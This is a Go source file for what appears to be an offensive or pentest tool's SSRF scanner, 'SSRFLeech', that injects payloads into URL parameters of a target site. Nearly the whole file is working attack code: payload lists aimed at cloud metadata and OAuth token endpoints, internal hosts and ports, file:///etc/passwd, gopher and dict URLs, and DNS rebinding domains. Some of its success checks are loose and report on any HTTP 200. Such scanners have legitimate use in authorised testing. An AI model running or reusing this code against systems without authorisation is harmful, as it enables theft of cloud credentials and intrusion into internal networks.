package web

import (
	"fmt"
	"io"
	"strings"

	"github.com/nexus-void/nexus-void/pkg/utils"
)

// SSRFLeech is the Server-Side Request Forgery testing engine
type SSRFLeech struct {
	Target string
}

// SSRFResult represents a confirmed SSRF finding
type SSRFResult struct {
	URL           string `json:"url"`
	Parameter     string `json:"parameter"`
	Payload       string `json:"payload"`
	TargetIP      string `json:"target_ip"`
	Proof         string `json:"proof"`
	Severity      string `json:"severity"`
	CloudMetadata bool   `json:"cloud_metadata"`
}

func NewSSRFLeech(target string) *SSRFLeech {
	return &SSRFLeech{Target: target}
}

// TestURL tests a URL for SSRF vulnerabilities
func (s *SSRFLeech) TestURL(targetURL string, params []string) []SSRFResult {
	fmt.Printf("[+] SSRF-LEECH scanning: %s\n", targetURL)

	var results []SSRFResult

	if len(params) == 0 {
		params = []string{"url", "uri", "path", "file", "document", "site", "href", "src", "endpoint", "redirect", "callback", "webhook"}
	}

	for _, param := range params {
		// Test cloud metadata
		if r := s.testCloudMetadata(targetURL, param); r != nil {
			results = append(results, *r)
			continue
		}

		// Test internal network
		if r := s.testInternalNetwork(targetURL, param); r != nil {
			results = append(results, *r)
			continue
		}

		// Test DNS rebinding
		if r := s.testDNSRebinding(targetURL, param); r != nil {
			results = append(results, *r)
			continue
		}

		// Test protocol smuggling
		if r := s.testProtocolSmuggling(targetURL, param); r != nil {
			results = append(results, *r)
			continue
		}
	}

	fmt.Printf("[+] SSRF-LEECH found %d SSRF vulnerabilities\n", len(results))
	return results
}

func (s *SSRFLeech) testCloudMetadata(targetURL, param string) *SSRFResult {
	cloudEndpoints := []struct {
		name    string
		payload string
		check   string
	}{
		{"AWS IMDSv1", "http://169.254.169.254/latest/meta-data/", "ami-id"},
		{"AWS IMDSv1", "http://169.254.169.254/latest/meta-data/instance-id", "i-"},
		{"AWS IMDSv2", "http://169.254.169.254/latest/api/token", "token"},
		{"GCP", "http://metadata.google.internal/computeMetadata/v1/", "project-id"},
		{"Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"},
		{"Azure", "http://169.254.169.254/metadata/identity/oauth2/token", "access_token"},
		{"DigitalOcean", "http://169.254.169.254/metadata/v1.json", "droplet_id"},
		{"Alibaba", "http://100.100.100.200/latest/meta-data/", "instance-id"},
		{"Oracle", "http://169.254.169.254/opc/v1/instance/", "instanceId"},
	}

	for _, endpoint := range cloudEndpoints {
		injectedURL := injectPayload(targetURL, param, endpoint.payload)
		resp, err := utils.Fetch(injectedURL, nil)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		if strings.Contains(bodyStr, endpoint.check) || resp.StatusCode == 200 {
			// For GCP, need special header
			if strings.Contains(endpoint.payload, "google.internal") {
				resp2, err := utils.Fetch(injectedURL, map[string]string{
					"Metadata-Flavor": "Google",
				})
				if err == nil {
					body2, _ := io.ReadAll(resp2.Body)
					resp2.Body.Close()
					if strings.Contains(string(body2), endpoint.check) {
						return &SSRFResult{
							URL:           targetURL,
							Parameter:     param,
							Payload:       endpoint.payload,
							TargetIP:      "169.254.169.254",
							Proof:         fmt.Sprintf("Cloud metadata accessible: %s", endpoint.name),
							Severity:      "critical",
							CloudMetadata: true,
						}
					}
				}
			} else {
				return &SSRFResult{
					URL:           targetURL,
					Parameter:     param,
					Payload:       endpoint.payload,
					TargetIP:      "169.254.169.254",
					Proof:         fmt.Sprintf("Cloud metadata accessible: %s", endpoint.name),
					Severity:      "critical",
					CloudMetadata: true,
				}
			}
		}
	}

	return nil
}

func (s *SSRFLeech) testInternalNetwork(targetURL, param string) *SSRFResult {
	internalTargets := []struct {
		payload string
		check   string
	}{
		{"http://127.0.0.1:22", "SSH"},
		{"http://127.0.0.1:80", "html"},
		{"http://127.0.0.1:8080", ""},
		{"http://localhost:3306", ""},
		{"http://0.0.0.0:22", "SSH"},
		{"http://[::1]:80", "html"},
		{"http://10.0.0.1:80", ""},
		{"http://192.168.1.1:80", ""},
		{"http://172.16.0.1:80", ""},
		{"dict://127.0.0.1:11211/stat", "STAT"},
		{"gopher://127.0.0.1:3306/_", ""},
		{"file:///etc/passwd", "root:"},
	}

	for _, target := range internalTargets {
		injectedURL := injectPayload(targetURL, param, target.payload)
		resp, err := utils.Fetch(injectedURL, nil)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		// Check for successful internal access
		if resp.StatusCode == 200 || strings.Contains(bodyStr, target.check) {
			return &SSRFResult{
				URL:       targetURL,
				Parameter: param,
				Payload:   target.payload,
				TargetIP:  "127.0.0.1",
				Proof:     fmt.Sprintf("Internal resource accessible: %s", target.payload),
				Severity:  "critical",
			}
		}

		// Check for different error patterns that indicate the request reached internally
		if strings.Contains(bodyStr, "Connection refused") ||
			strings.Contains(bodyStr, "Connection timed out") ||
			strings.Contains(bodyStr, "No route to host") {
			return &SSRFResult{
				URL:       targetURL,
				Parameter: param,
				Payload:   target.payload,
				TargetIP:  "127.0.0.1",
				Proof:     fmt.Sprintf("SSRF confirmed - internal error: %s", target.payload),
				Severity:  "high",
			}
		}
	}

	return nil
}

func (s *SSRFLeech) testDNSRebinding(targetURL, param string) *SSRFResult {
	// DNS rebinding test using public rebinding services
	dnsRebindingDomains := []string{
		"http://make-127.0.0.1.rebind.network/",
		"http://7f000001.rebind.it/",
	}

	for _, domain := range dnsRebindingDomains {
		injectedURL := injectPayload(targetURL, param, domain)
		resp, err := utils.Fetch(injectedURL, nil)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode == 200 || len(body) > 0 {
			return &SSRFResult{
				URL:       targetURL,
				Parameter: param,
				Payload:   domain,
				TargetIP:  "127.0.0.1 (DNS rebinding)",
				Proof:     "DNS rebinding successful",
				Severity:  "critical",
			}
		}
	}

	return nil
}

func (s *SSRFLeech) testProtocolSmuggling(targetURL, param string) *SSRFResult {
	protocolPayloads := []struct {
		payload string
		desc    string
	}{
		{"http://169.254.169.254:80/latest/meta-data/", "HTTP port 80 metadata"},
		{"https://169.254.169.254:443/latest/meta-data/", "HTTPS port 443 metadata"},
		{"ftp://169.254.169.254/", "FTP protocol"},
		{"ldap://169.254.169.254/", "LDAP protocol"},
		{"tftp://169.254.169.254/", "TFTP protocol"},
	}

	for _, proto := range protocolPayloads {
		injectedURL := injectPayload(targetURL, param, proto.payload)
		resp, err := utils.Fetch(injectedURL, nil)
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			resp.Body.Close()
			return &SSRFResult{
				URL:       targetURL,
				Parameter: param,
				Payload:   proto.payload,
				TargetIP:  "169.254.169.254",
				Proof:     fmt.Sprintf("Protocol smuggling: %s", proto.desc),
				Severity:  "critical",
			}
		}
		resp.Body.Close()
	}

	return nil
}
